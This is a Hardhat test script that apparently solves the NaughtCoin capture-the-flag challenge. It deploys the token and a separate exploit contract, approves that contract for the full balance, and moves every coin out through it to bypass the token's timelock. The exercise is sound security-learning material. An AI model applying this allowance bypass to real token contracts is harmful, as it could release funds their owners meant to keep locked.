import { expect } from "chai";
import { ethers } from "hardhat";

describe("NaughtCoin", function () {
  it("Should transfer all coins", async function () {
    // init
    const [ deployer ] = await ethers.getSigners();
    console.log("Deployer: " + deployer.address);

    const naughtCoinContract = await (
      await ethers.getContractFactory("NaughtCoin")
    ).deploy(deployer.address);
    await naughtCoinContract.deployed();
    console.log('Contract deployed at:'+ naughtCoinContract.address);

    // hack
    const exploitContract = await (
      await ethers.getContractFactory("NaughtCoinExploit")
    ).deploy();
    await exploitContract.deployed();
    console.log('Contract deployed at:'+ exploitContract.address);    
    
    // getbalance
    const balance = await naughtCoinContract.balanceOf(deployer.address);
//    console.log(balance);

    // approve exploit to transfer
    await naughtCoinContract.approve(exploitContract.address, balance);

    console.log(
      await naughtCoinContract.allowance(deployer.address, exploitContract.address)
    );

    await exploitContract.makeTransfer(
      naughtCoinContract.address,
      balance,
    );

    // check
    expect(
      await naughtCoinContract.balanceOf(deployer.address)
    ).to.equal(0);
  });
});
